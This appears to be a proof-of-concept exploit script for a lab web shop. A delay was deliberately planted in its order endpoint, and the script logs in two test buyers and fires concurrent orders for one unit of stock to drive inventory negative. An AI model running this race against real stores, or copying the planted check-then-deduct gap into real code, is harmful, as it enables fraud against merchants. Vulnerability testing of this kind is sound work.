#!/usr/bin/env python3
"""
BL-3 — TOCTOU Inventory Race Condition
Endpoint: POST /api/orders
Auth    : Any buyer (two concurrent sessions)

A time.sleep(0.15) was inserted in create_order between the inventory
availability check and the inventory deduction. This 150ms window lets
two concurrent requests both pass the "enough stock?" check before
either one deducts inventory — resulting in negative inventory and
both orders being fulfilled even if only one unit existed.

Usage
-----
    python poc_012_toctou_inventory_race.py
    python poc_012_toctou_inventory_race.py --url http://localhost:8000 --product 1
"""

import argparse
import sys
import threading
import requests

BUYER1_EMAIL    = "charlie@mercury.com"
BUYER1_PASSWORD = "Buyer123!"
BUYER2_EMAIL    = "diana@mercury.com"
BUYER2_PASSWORD = "Buyer123!"
SELLER_EMAIL    = "alice@mercury.com"
SELLER_PASSWORD = "Seller123!"


def banner():
    print("=" * 60)
    print("  BL-3 — TOCTOU Inventory Race Condition")
    print("  Endpoint: POST /api/orders")
    print("=" * 60)


def login(base_url, email, password, label):
    resp = requests.post(f"{base_url}/api/auth/login",
                         json={"email": email, "password": password}, timeout=10)
    resp.raise_for_status()
    token = resp.json().get("access_token")
    if not token:
        print(f"[-] Login failed for {label}"); sys.exit(1)
    print(f"[+] Authenticated as {label}")
    return token


def deposit(base_url, token, amount):
    requests.post(f"{base_url}/api/wallet/deposit",
                  headers={"Authorization": f"Bearer {token}"},
                  json={"amount": amount, "payment_method": "card"}, timeout=10)


def set_product_quantity(base_url, token, product_id, qty):
    resp = requests.put(f"{base_url}/api/products/{product_id}",
                        headers={"Authorization": f"Bearer {token}"},
                        json={"quantity": qty}, timeout=10)
    return resp.status_code == 200


def get_product_quantity(base_url, token, product_id):
    resp = requests.get(f"{base_url}/api/products/{product_id}",
                        headers={"Authorization": f"Bearer {token}"}, timeout=10)
    resp.raise_for_status()
    return resp.json()["quantity"]


def place_order(base_url, token, product_id, results, label):
    resp = requests.post(f"{base_url}/api/orders",
                         headers={"Authorization": f"Bearer {token}"},
                         json={"items": [{"product_id": product_id, "quantity": 1}],
                               "shipping_address": "race"}, timeout=20)
    results[label] = (resp.status_code, resp.json())


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://localhost:8000")
    parser.add_argument("--product", type=int, default=1)
    args = parser.parse_args()

    banner()
    buyer1 = login(args.url, BUYER1_EMAIL, BUYER1_PASSWORD, "Buyer1 (charlie)")
    buyer2 = login(args.url, BUYER2_EMAIL, BUYER2_PASSWORD, "Buyer2 (diana)  ")
    seller = login(args.url, SELLER_EMAIL, SELLER_PASSWORD, "Seller (alice)  ")
    print()

    deposit(args.url, buyer1, 500)
    deposit(args.url, buyer2, 500)

    # Set product stock to exactly 1 unit
    if set_product_quantity(args.url, seller, args.product, 1):
        print(f"[*] Product #{args.product} stock set to 1 unit")
    else:
        print(f"[!] Could not set stock — proceeding with current stock")

    qty_before = get_product_quantity(args.url, seller, args.product)
    print(f"[*] Stock before race: {qty_before}")
    print(f"[*] Launching 2 concurrent orders for 1 unit each ...")
    print()

    results = {}
    t1 = threading.Thread(target=place_order, args=(args.url, buyer1, args.product, results, "buyer1"))
    t2 = threading.Thread(target=place_order, args=(args.url, buyer2, args.product, results, "buyer2"))

    t1.start(); t2.start()
    t1.join();  t2.join()

    for label, (code, data) in results.items():
        if code in (200, 201):
            print(f"[+] {label}: ORDER PLACED  (id={data.get('id')}, total=${data.get('total_amount')})")
        else:
            print(f"[-] {label}: {code} — {data.get('detail')}")

    qty_after = get_product_quantity(args.url, seller, args.product)
    print(f"\n[*] Stock after race: {qty_after}  (was {qty_before})")
    if qty_after < 0:
        print(f"[+] CONFIRMED — inventory is negative! Race condition succeeded.")

    print("\n[+] Done.")


if __name__ == "__main__":
    main()
